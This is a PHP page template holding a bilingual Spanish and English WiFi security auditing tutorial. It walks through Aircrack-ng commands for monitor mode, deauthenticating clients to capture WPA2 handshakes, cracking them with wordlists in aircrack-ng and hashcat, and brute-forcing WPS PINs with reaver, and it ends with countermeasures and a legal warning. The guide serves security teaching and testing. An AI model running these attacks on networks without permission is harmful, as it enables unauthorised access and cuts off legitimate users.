<?php
require_once __DIR__ . '/../bootstrap.php';
$pageTitle    = $lang==='es' ? 'Auditoría de Redes Inalámbricas — CyberEscudo' : 'Wireless Network Auditing — CyberEscudo';
$contentTitle = $lang==='es' ? 'Auditoría de Redes Inalámbricas' : 'Wireless Network Auditing';
$contentDate  = '2022-05-15';
$contentTags  = ['WiFi','WPA2','Aircrack-ng','Wireless','Auditoría'];
ob_start(); if ($lang==='es'): ?>
<div class="prose">
  <p>Guía de <strong>auditoría de seguridad en redes WiFi</strong> con Aircrack-ng: captura del handshake WPA2, cracking con diccionario y configuraciones inseguras como WPS y WEP.</p>

  <div style="background:rgba(140,45,45,0.15);border-left:4px solid #C0392B;padding:1rem 1.5rem;margin:1.5rem 0;border-radius:0 4px 4px 0;">
    <strong>⚠️ Aviso legal:</strong> Estas técnicas solo deben aplicarse sobre redes propias o con permiso explícito por escrito del propietario. El acceso no autorizado a redes WiFi es un delito penal.
  </div>

  <h2>1. Preparación — Modo monitor</h2>
  <pre><code># Listar interfaces WiFi:
iwconfig
airmon-ng

# Comprobar procesos que puedan interferir:
airmon-ng check

# Matar procesos conflictivos:
airmon-ng check kill

# Activar modo monitor:
airmon-ng start wlan0
# Crea la interfaz wlan0mon

# Verificar modo monitor:
iwconfig wlan0mon</code></pre>

  <h2>2. Descubrimiento de redes</h2>
  <pre><code># Escanear todas las redes cercanas:
airodump-ng wlan0mon

# Información mostrada:
# BSSID:   MAC del punto de acceso
# CH:      Canal
# ENC:     Cifrado (WPA2, WEP, OPN)
# ESSID:   Nombre de la red
# #Data:   Paquetes de datos capturados
# STATION: Clientes conectados</code></pre>

  <h2>3. Captura del handshake WPA2</h2>
  <pre><code># Capturar tráfico de la red objetivo:
airodump-ng -c [CANAL] --bssid [BSSID_AP] -w handshake wlan0mon
# Ejemplo:
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w captura wlan0mon

# Esperar a que un cliente se conecte (handshake natural)
# O forzar desautenticación para capturar el rehandshake:
# (Abrir otra terminal)
aireplay-ng -0 5 -a [BSSID_AP] -c [MAC_CLIENTE] wlan0mon
# -0 5: enviar 5 paquetes deauth
# El cliente se desconecta y reconecta → capturamos el handshake

# Confirmar captura del handshake en la esquina superior derecha:
# "WPA handshake: AA:BB:CC:DD:EE:FF"</code></pre>

  <h2>4. Cracking del handshake WPA2</h2>
  <pre><code># Con Aircrack-ng (CPU) + diccionario:
aircrack-ng -w /usr/share/wordlists/rockyou.txt captura-01.cap

# Con Hashcat (GPU, mucho más rápido):
# Convertir .cap a formato Hashcat:
hcxpcapngtool -o hash.hc22000 captura-01.cap

# Cracking con Hashcat WPA2:
hashcat -a 0 -m 22000 hash.hc22000 rockyou.txt

# Con reglas para aumentar el alcance:
hashcat -a 0 -m 22000 hash.hc22000 rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule</code></pre>

  <h2>5. Ataque WPS (PIN de 8 dígitos)</h2>
  <pre><code># Escanear redes con WPS activo:
wash -i wlan0mon

# Ataque por fuerza bruta al PIN WPS:
reaver -i wlan0mon -b [BSSID_AP] -vv

# Ataque Pixie Dust (más rápido en APs vulnerables):
reaver -i wlan0mon -b [BSSID_AP] -vv -K 1</code></pre>

  <h2>6. Contramedidas WiFi</h2>
  <table>
    <thead><tr><th>Medida</th><th>Descripción</th></tr></thead>
    <tbody>
      <tr><td>Usar WPA3</td><td>Protocolo más seguro. Usa SAE en lugar de PSK.</td></tr>
      <tr><td>Contraseña larga y aleatoria</td><td>Mínimo 20 caracteres. Imposible de crackear por diccionario.</td></tr>
      <tr><td>Deshabilitar WPS</td><td>WPS es vulnerable a ataques de fuerza bruta (PIN de 8 dígitos).</td></tr>
      <tr><td>Red de invitados</td><td>Separar dispositivos IoT y visitas de la red principal.</td></tr>
      <tr><td>Filtrado MAC</td><td>Solo permite MACs autorizadas (evitable con MAC spoofing).</td></tr>
      <tr><td>SSID oculto</td><td>No publicar el nombre de la red (baja eficacia, fácil de descubrir).</td></tr>
    </tbody>
  </table>
</div>
<?php else: ?>
<div class="prose">
  <p>WiFi security auditing guide with Aircrack-ng: WPA2 handshake capture, dictionary cracking and WPS attacks.</p>

  <div style="background:rgba(140,45,45,0.15);border-left:4px solid #C0392B;padding:1rem 1.5rem;margin:1.5rem 0;border-radius:0 4px 4px 0;">
    <strong>Legal Warning:</strong> Only audit networks you own or have explicit written permission to test.
  </div>

  <h2>1. Enable Monitor Mode</h2>
  <pre><code>airmon-ng check kill
airmon-ng start wlan0   # Creates wlan0mon</code></pre>

  <h2>2. Network Discovery</h2>
  <pre><code>airodump-ng wlan0mon
# Shows: BSSID, Channel, Encryption, SSID, Connected clients</code></pre>

  <h2>3. Capture WPA2 Handshake</h2>
  <pre><code>airodump-ng -c [CH] --bssid [AP_MAC] -w capture wlan0mon
# Force deauth to capture re-handshake:
aireplay-ng -0 5 -a [AP_MAC] -c [CLIENT_MAC] wlan0mon</code></pre>

  <h2>4. Crack the Handshake</h2>
  <pre><code># Aircrack-ng (CPU):
aircrack-ng -w rockyou.txt capture-01.cap

# Hashcat (GPU — much faster):
hcxpcapngtool -o hash.hc22000 capture-01.cap
hashcat -a 0 -m 22000 hash.hc22000 rockyou.txt</code></pre>

  <h2>5. WPS Attack</h2>
  <pre><code>wash -i wlan0mon              # Find WPS-enabled APs
reaver -i wlan0mon -b [AP_MAC] -vv     # Brute force PIN
reaver -i wlan0mon -b [AP_MAC] -vv -K 1  # Pixie Dust</code></pre>

  <h2>6. Countermeasures</h2>
  <table>
    <thead><tr><th>Measure</th><th>Description</th></tr></thead>
    <tbody>
      <tr><td>Use WPA3</td><td>Most secure protocol — uses SAE instead of PSK</td></tr>
      <tr><td>Long random passphrase</td><td>20+ chars — impossible to dictionary-crack</td></tr>
      <tr><td>Disable WPS</td><td>WPS 8-digit PIN is vulnerable to brute force</td></tr>
      <tr><td>Guest network</td><td>Isolate IoT devices and visitors</td></tr>
    </tbody>
  </table>
</div>
<?php endif; $contentBody=ob_get_clean(); require __DIR__.'/../templates/content-page.php';
